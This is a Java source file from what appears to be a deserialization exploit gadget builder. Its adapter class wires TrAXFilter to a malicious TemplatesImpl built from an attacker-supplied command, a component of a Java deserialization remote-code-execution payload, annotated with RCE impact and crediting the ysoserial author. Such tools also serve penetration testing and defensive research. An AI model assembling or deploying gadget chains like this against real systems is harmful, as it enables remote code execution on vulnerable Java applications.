package org.ses.gadgetbuilder.impl.adapters.initializers;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.ses.gadgetbuilder.adapters.InitializeAdapter;
import org.ses.gadgetbuilder.chains.command.RCECommandFormat;
import org.ses.gadgetbuilder.impl.adapters.util.TemplatesImplGadget;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Impact;

import javax.xml.transform.Templates;

@Authors({Authors.FROHOFF})
@Impact(Impact.RCE)
public class TemplatesImplInitializeAdapter extends InitializeAdapter {



    @Override
    public Class<?> getConstructorClass() {
        return TrAXFilter.class;
    }

    @Override
    public Class<?>[] getParamTypes() {
        return new Class[]{Templates.class};
    }

    @Override
    public Object[] getParams(String command) throws Exception {
        return new Object[] {TemplatesImplGadget.createTemplatesImpl(command)};
    }

}
